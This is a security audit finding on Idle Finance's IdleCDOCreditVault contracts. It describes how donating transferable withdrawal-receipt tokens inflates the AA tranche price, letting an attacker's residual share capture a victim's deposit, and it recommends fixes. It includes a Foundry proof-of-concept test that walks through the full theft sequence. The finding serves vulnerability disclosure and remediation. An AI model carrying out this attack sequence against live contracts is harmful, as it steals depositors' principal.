### Title
Donated withdrawal-receipt strategy tokens inflate AA tranche price and enable first-depositor theft - (File: `contracts/IdleCDOCreditVault.sol`)

### Summary
`IdleCDOEpochVariant` counts the CDO’s full `IdleCreditVault` ERC20 balance as managed NAV, but withdrawal receipts are minted as freely transferable units of that same ERC20 token. An attacker can reduce a tranche to one residual share, request a withdrawal on a second account, donate the resulting receipt tokens to the CDO, and thereby inflate the tranche price without increasing supply. A subsequent victim deposit can mint zero shares while still increasing NAV, allowing the attacker’s residual share to claim the victim’s principal. [1](#0-0) [2](#0-1) 

### Finding Description
The credit-vault CDO prices deposits using `amount * 1e18 / tranchePrice`, and `tranchePrice` is ultimately derived from saved tranche NAV divided by tranche supply. [3](#0-2) 

A depositor can leave only one tranche wei outstanding: for a 6-decimal underlying, depositing one underlying wei initially mints `1e12` tranche wei at the initialized `oneToken` price; requesting `supply - 1` tranche wei rounds the underlying withdrawal to zero, burns almost all shares, and leaves NAV unchanged. [4](#0-3) [5](#0-4) 

A second attacker account can then deposit `D`, request withdrawal of all its tranche tokens, and receive `D` `IdleCreditVault` receipt tokens; `requestWithdraw` burns the CDO’s principal tokens and mints transferable receipt tokens to the user. [6](#0-5) [7](#0-6) 

Transferring those receipt tokens back to the CDO raises `getContractValue()`/`_managedContractValue()` by `D`, because NAV is based on the raw `balanceOf(cdo)` rather than a separately tracked balance of CDO-owned principal tokens. [1](#0-0) 

The existing donation defense does not stop this because `_skimDonatedAssets()` only transfers raw `token`, not donated `strategyToken` balances. [8](#0-7) [9](#0-8) 

After the donation, the one-share tranche has NAV approximately `D + 1`; a victim deposit `X < D` mints zero shares but still increases `lastNAV` by `X`, because `_mintShares()` adds the full underlying amount independently of the minted share count. [10](#0-9) 

### Impact Explanation
This is a direct principal-theft vulnerability. With `D = 1,000` underlying units and a victim deposit of `999`, the victim receives zero tranche tokens while the tranche NAV becomes approximately `1,999`; the attacker’s one residual share is then redeemable for approximately the entire NAV through the normal withdrawal-request flow. [11](#0-10) [12](#0-11) 

The donated receipt also creates an accounting/solvency mismatch: the original withdrawal request remains recorded while its receipt token is counted as CDO-owned active NAV. [13](#0-12) 

### Likelihood Explanation
The attack is executable by ordinary KYC-passing lenders during the buffer phase, when deposits and withdrawal requests are enabled. [14](#0-13) [15](#0-14) 

It requires the attacker to establish the first or residual tranche position and front-run or otherwise precede a victim deposit smaller than the donated amount. The attacker temporarily gives up direct control of the receipt donation, but recovers its value plus the victim’s unpriced deposit through the residual tranche share.

Existing guards do not prevent it: deposits skim only underlying donations, withdrawal receipts are transferable ERC20 tokens, tranche minting accepts zero shares for a nonzero deposit, and there is no minimum-share or virtual-offset protection. [16](#0-15) [6](#0-5) [11](#0-10) 

### Recommendation
- Track `managedStrategyBalance` internally and update it only on protocol-controlled mint/burn paths instead of deriving managed NAV from `balanceOf(cdo)`.
- Make withdrawal receipts non-transferable or use a separate non-transferable receipt token/NFT so user receipts cannot be mistaken for CDO-owned principal backing.
- Revert deposits that would mint zero shares, or mint dead/virtual shares using an ERC4626-style offset.
- Add an invariant test that unsolicited `strategyToken` transfers to the CDO do not change `virtualPrice`, `getContractValue`, or managed NAV.
- Consider permanently burning a small amount of initial tranche supply to make residual-share manipulation harder, while still treating receipt isolation as the primary fix.

### Proof of Concept
The following Foundry test sketches the complete buffer-phase flow using a 6-decimal underlying such as USDC:

```solidity
// test/foundry/IdleCreditVaultReceiptDonation.t.sol
function testReceiptDonationInflatesTrancheAndStealsDeposit() external {
    address attackerA = makeAddr("attackerA");
    address attackerB = makeAddr("attackerB");
    address victim = makeAddr("victim");

    uint256 donation = 1_000e6;
    uint256 victimDeposit = 999e6;

    _allowWallet(attackerA);
    _allowWallet(attackerB);
    _allowWallet(victim);

    // Leave attackerA with one residual tranche wei and one wei of NAV.
    deal(defaultUnderlying, attackerA, 1);
    vm.startPrank(attackerA);
    underlying.approve(address(cdoEpoch), 1);
    cdoEpoch.depositAA(1);

    uint256 dustSupply = AAtranche.balanceOf(attackerA);
    cdoEpoch.requestWithdraw(dustSupply - 1, address(AAtranche));
    vm.stopPrank();

    assertEq(AAtranche.balanceOf(attackerA), 1);
    assertEq(cdoEpoch.lastNAVAA(), 1);

    // attackerB turns principal into a transferable withdrawal receipt.
    deal(defaultUnderlying, attackerB, donation);
    vm.startPrank(attackerB);
    underlying.approve(address(cdoEpoch), donation);
    cdoEpoch.depositAA(donation);
    cdoEpoch.requestWithdraw(0, address(AAtranche));

    uint256 receiptDonation = strategy.balanceOf(attackerB);
    assertEq(receiptDonation, donation);

    // Same ERC20 token is counted as CDO-owned active backing.
    strategy.transfer(address(cdoEpoch), receiptDonation);
    vm.stopPrank();

    // Victim deposit is below the donated NAV per residual share and mints zero.
    deal(defaultUnderlying, victim, victimDeposit);
    vm.startPrank(victim);
    underlying.approve(address(cdoEpoch), victimDeposit);
    uint256 minted = cdoEpoch.depositAA(victimDeposit);
    vm.stopPrank();

    assertEq(minted, 0);
    assertEq(AAtranche.balanceOf(victim), 0);
    assertEq(AAtranche.totalSupply(), 1);

    // Attacker's one share now claims donation + victim deposit + residual wei.
    vm.startPrank(attackerA);
    uint256 requested = cdoEpoch.requestWithdraw(0, address(AAtranche));
    vm.stopPrank();

    assertApproxEqAbs(
        requested,
        donation + victimDeposit + 1,
        2,
        "residual share captures victim deposit"
    );
}
```

The exact assertion may need a small tolerance for performance fees, management-fee accrual, and integer rounding, but the broken invariant is deterministic: a nonzero victim deposit mints zero shares while the attacker’s one residual share claims the increased NAV.

### Citations

**File:** contracts/IdleCDOCreditVault.sol (L72-75)
```text
    uint256 _oneToken = 10**(IERC20Detailed(_guardedToken).decimals());
    oneToken = _oneToken;
    priceAA = _oneToken;
    priceBB = _oneToken;
```

**File:** contracts/IdleCDOCreditVault.sol (L125-137)
```text
  function getContractValue() public override view returns (uint256) {
    // Credit vault strategy tokens are minted 1:1 with underlyings and use the same decimals.
    return _contractTokenBalance(strategyToken) + _contractTokenBalance(token) - unclaimedFees;
  }

  /// @notice Calculates the current managed net TVL.
  /// @dev Raw underlyings held by the CDO are excluded because unsolicited transfers are skimmed on interactions.
  /// @return Strategy-token-backed TVL net of accrued fees.
  function _managedContractValue() internal virtual view returns (uint256) {
    uint256 strategyTokenBalance = _contractTokenBalance(strategyToken);
    uint256 fees = unclaimedFees;
    return strategyTokenBalance > fees ? strategyTokenBalance - fees : 0;
  }
```

**File:** contracts/IdleCDOCreditVault.sol (L335-362)
```text
    // Split the new NAV (_lastTrancheNAV + _totalTrancheGain) per tranche token
    _virtualPrice = uint256(int256(_lastTrancheNAV) + _totalTrancheGain) * ONE_TRANCHE_TOKEN / trancheSupply;
  }

  /// @notice mint tranche tokens at current price and updates tranche last NAV
  /// @param _amount, in underlyings, to convert in tranche tokens
  /// @param _to receiver address of the newly minted tranche tokens
  /// @param _tranche tranche address
  /// @return _minted number of tranche tokens minted
  function _mintSharesAtCurrPrice(uint256 _amount, address _to, address _tranche) internal virtual returns (uint256 _minted) {
    // calculate # of tranche token to mint based on current tranche price: _amount / tranchePrice
    _minted = _amount * ONE_TRANCHE_TOKEN / _tranchePrice(_tranche);
    _mintShares(_tranche, _to, _minted, _amount);
  }

  /// @notice mint tranche tokens and updates tranche last NAV
  /// @param _tranche tranche address
  /// @param _to receiver address of the newly minted tranche tokens
  /// @param _shares number of tranche tokens to mint
  /// @param _underlyings amount of underlyings added to the tranche
  function _mintShares(address _tranche, address _to, uint256 _shares, uint256 _underlyings) internal {
    IdleCDOTranche(_tranche).mint(_to, _shares);
    // update NAV with the _amount of underlyings added
    if (_tranche == AATranche) {
      lastNAVAA += _underlyings;
    } else {
      lastNAVBB += _underlyings;
    }
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L29-34)
```text
contract IdleCreditVault is
  Initializable,
  OwnableUpgradeable,
  ERC20Upgradeable,
  ReentrancyGuardUpgradeable,
  IIdleCDOStrategy
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L272-294)
```text
    // burn strategy tokens from cdo (we don't burn future interest here, only the principal)
    _burn(msg.sender, _principal);
    // mint equal amount of strategy tokens to the user as receipt (interest included), useful in case of default
    _mint(_user, _amount);
    // A successfully closed pool already recalled all funds and has no later stopEpoch.
    if (!isClosed) {
      // Global amount that stopEpoch must source from borrower/strategy for all pending receipts.
      pendingWithdraws += _amount;
    }
    // save the epoch of the last withdraw request (buffer + epochDuration is 1 epoch)
    lastWithdrawRequest[_user] = currentEpoch;
    // APR=0 requests keep separate accounting and settle interest at stopEpoch.
    // `_amount` here is the post-management-fee principal bucket for that flow.
    if (unscaledApr == 0 && !isClosed) {
      _requestWithdrawApr0(_amount, _user);
    } else {
      // increase the withdraw requests for the user
      // we record both per-user (old, kept for compatibility) and per-epoch so
      // on finalization we can distinguish "default-epoch pending receipts"
      // from old funded receipts.
      withdrawsRequests[_user] += _amount;
      withdrawsRequestsByEpoch[_user][currentEpoch] += _amount;
    }
```

**File:** contracts/IdleCDOEpochVariant.sol (L78-86)
```text
    // allow requests for withdrawals
    allowAAWithdrawRequest = true;
    allowBBWithdrawRequest = true;

    // default no instant withdraw allowed
    disableInstantWithdraw = true;

    // by default deposits during an epoch are disabled
    isDepositDuringEpochDisabled = true;
```

**File:** contracts/IdleCDOEpochVariant.sol (L643-649)
```text
  /// @notice Deposit funds in the vault. Overrides the parent method and adds a check for wallet 
  function _deposit(uint256 _amount, address _tranche) internal override whenNotPaused returns (uint256) {
    _checkNotAllowed(!isWalletAllowed(msg.sender));
    // we check if there are donated assets to the pool and transfer them to the feeReceiver if any
    _skimDonatedAssets();
    // do the inherited deposit flow
    return super._deposit(_amount, _tranche);
```

**File:** contracts/IdleCDOEpochVariant.sol (L739-790)
```text
  function requestWithdraw(uint256 _amount, address _tranche) external returns (uint256 _underlyings) {
    _checkTranche(_tranche);
    _checkNotAllowed(
      (_tranche == AATranche ? !allowAAWithdrawRequest : !allowBBWithdrawRequest) ||
      !isWalletAllowed(msg.sender)
    );
  
    // we check if there are donated assets to the pool and transfer them to the feeReceiver if any
    _skimDonatedAssets();

    // we trigger an update accounting to check for eventual losses
    _updateAccounting();

    IdleCreditVault creditVault = IdleCreditVault(strategy);
    if (_amount == 0) {
      _amount = _userTrancheBal(msg.sender, _tranche);
    }
    _underlyings = _trancheToUnderlyings(_amount, _tranche);

    // Programmable borrower deployments do not support instant withdrawals.
    // If apr decresed wrt last epoch, request instant withdraw and burn tranche tokens directly
    // we compare unscaled aprs
    if (_isInstantWithdrawEnabled()) {
      uint256 currentApr = creditVault.unscaledApr();
      if (lastEpochApr > (currentApr + instantWithdrawAprDelta)) {
        // burn strategy tokens from cdo and mint an equal amount to msg.sender as receipt
        creditVault.requestInstantWithdraw(_underlyings, msg.sender);
        // burn tranche tokens and decrease NAV
        _withdrawOps(_amount, _underlyings, _tranche);
        return _underlyings;
      }
    }

    uint256 principal = _underlyings;
    (uint256 interest, int256 diff) = _calcInterestWithdrawRequest(_underlyings, _tranche);
    uint256 totalFees = _totalWithdrawFees(principal, interest);
    // user is requesting principal + interest minus upfront management fee and net performance fee
    _underlyings = principal + interest - totalFees;
    // add expected fees to pending withdraw fees counter
    pendingWithdrawFees += totalFees;

    /// if there is an AA withdrawal the overperformance that the amount withdrawed would have generated for BB tranches
    /// is saved in interestForOverUnderPerformance. This is used to calculate the interest that should be added to the
    /// expectedEpochInterest at the startEpoch.
    /// If there is a BB withdrawal this amount is subtracted from the expectedEpochInterest
    interestForOverUnderPerformance += diff;

    // The receipt is fixed now and leaves live NAV. Charge management fees upfront
    // for the time it waits outside live NAV: remaining buffer plus the next epoch.
    creditVault.requestWithdraw(_underlyings, msg.sender, principal);
    // burn tranche tokens and decrease NAV without interest for the next epoch as it was not yet counted in NAV
    _withdrawOps(_amount, principal, _tranche);
```

**File:** contracts/IdleCDOEpochVariant.sol (L793-796)
```text
  /// @notice Transfer donated assets to the feeReceiver
  function _skimDonatedAssets() internal {
    _transferUnderlyings(feeReceiver, _contractTokenBalance(token));
  }
```
